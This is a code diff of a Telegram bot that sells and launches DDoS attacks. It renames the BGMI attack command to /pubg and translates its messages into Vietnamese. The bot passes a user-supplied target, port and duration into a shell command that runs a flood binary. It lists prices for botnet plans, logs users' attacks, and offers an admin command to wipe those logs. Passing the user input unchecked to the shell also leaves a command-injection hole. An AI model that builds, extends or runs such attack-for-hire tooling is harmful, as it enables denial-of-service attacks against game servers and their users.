@@ -198,7 +198,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['pubg'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -206,7 +206,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+                response = "Bạn đang bị khóa tạm thời. Vui lòng chờ 5 phút trước khi thực hiện lệnh /pubg một lần nữa."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -220,14 +220,14 @@ def handle_bgmi(message):
             if time > 181:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/pubg', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./pubg {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀: {target} Port: {port} Port: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\n"  # Updated command syntax
+            response = "Usage :- /pubg <TARGET> <PORT> <TIME> <METHOD>\n"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command.\n"
 
@@ -258,11 +258,11 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
- /rules : Please Check Before Use !!.
- /mylogs : To Check Your Recents Attacks.
- /plan : Checkout Our Botnet Rates.
+    help_text = '''Danh Sách Các Lệnh:
+ /pubg : Phương pháp tấn công máy chủ pubg.
+ /rules : Xem quy định trước khi sử dụng !!
+ /mylogs : Kiểm tra các cuộc tấn công gần đây của bạn.
+ /plan : Xem bảng giá và gói dịch vụ của botnet.
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
@@ -288,43 +288,41 @@ def welcome_start(message):
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules:
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+    response = f'''{user_name} Vui lòng tuân thủ các quy tắc sau::
+1. Đừng thực hiện quá nhiều cuộc tấn công!! Điều này có thể dẫn đến việc bị cấm khỏi bot.
+2. Đừng chạy 2 cuộc tấn công cùng lúc vì nếu làm vậy, bạn sẽ bị cấm khỏi bot.
+3. Chúng tôi kiểm tra nhật ký hàng ngày, vì vậy hãy tuân thủ các quy tắc này để tránh bị cấm!!
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Plan Arthur Vip !!:
 
-Vip :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
+Vip Plan:
+-> Thời gian tấn công: 200 giây
+-> Giới hạn sau mỗi cuộc tấn công: 2 phút
+-> Số lượng tấn công đồng thời: 300
 
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
-
+Bảng giá:
+Ngày --> 50 VND
+Tuần --> 100 VND
+Tháng --> 250 VND
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
+    response = f'''{user_name}, Danh Sách Lệnh Dành Cho Admin!!:
 
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
+/add <userId> : Triệu tập một thành viên mới vào hệ thống.
+/remove <userId> : Xóa sổ một tài khoản khỏi cơ sở dữ liệu.
+/allusers : Liệt kê các chiến binh đang hoạt động trong mạng lưới.
+/logs : Truy xuất toàn bộ lịch sử hoạt động.
+/broadcast : Truyền tải thông điệp tới tất cả node.
+/clearlogs : Xóa sạch mọi dấu vết từ các nhật ký.
 
 '''
     bot.reply_to(message, response)
